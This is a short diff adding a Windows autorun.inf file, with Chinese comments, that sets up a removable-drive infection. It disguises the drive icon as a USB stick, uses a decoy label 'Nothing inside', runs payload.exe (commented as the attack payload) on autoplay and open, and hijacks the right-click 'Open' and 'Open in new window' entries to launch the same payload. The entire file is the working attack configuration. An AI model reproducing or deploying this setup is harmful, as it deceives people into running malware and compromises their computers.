@@ -1,0 +1,18 @@
+[AutoRun]
+autoplay=true
+
+;将驱动器图标伪装为U盘图标
+icon=c:\windows\system32\shell32.dll,79
+
+;驱动器名称
+label=Nothing inside
+
+;攻击Payload，此处为运行根目录下的payload.exe
+open=payload.exe
+run=payload.exe
+
+;劫持右键菜单
+shell\open=打开(&O)
+shell\open\Command=payload.exe
+shell\opennewwindow=在新窗口中打开(&E) 
+shell\opennewwindow\Command=payload.exe
